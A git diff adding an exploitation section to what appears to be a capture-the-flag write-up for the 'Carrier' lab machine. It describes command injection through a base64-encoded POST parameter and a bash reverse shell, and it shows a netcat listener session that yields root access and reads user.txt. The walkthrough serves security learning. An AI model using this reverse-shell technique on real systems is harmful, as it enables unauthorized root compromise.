@@ -109,8 +109,33 @@ By changing the parameter to “id” and then encoding it with base64 encode an
 
 ![source-01](/img/Screenshot_2020-05-27_17-41-07.png){: .align-left}
 
-And it works, we have command injection and it shows as root !!
+And it works, we have command injection and it shows as root !!. It is even possible to get user.txt file before getting a reverseShell.
 
+#### Exploitation:
+
+Lets get a reverse shell back to our attacker machine for further exploitation.
+I am going to send a simple bash shell encoded in base 64
+
+![source-01](/img/Screenshot_2020-05-27_18-36-08.png){: .align-left}
+
+Send the command inside the POST request via the check parameter. After executing it got a reverse Shell as root, but root flag is not here.
+
+```python
+
+➜  carrier nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.10.14.41] from (UNKNOWN) [10.10.10.105] 51560
+bash: cannot set terminal process group (2323): Inappropriate ioctl for device
+bash: no job control in this shell
+root@r1:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@r1:~# ls
+ls
+test_intercept.pcap
+user.txt
+root@r1:~# cat user.txt
+```
 
 
 
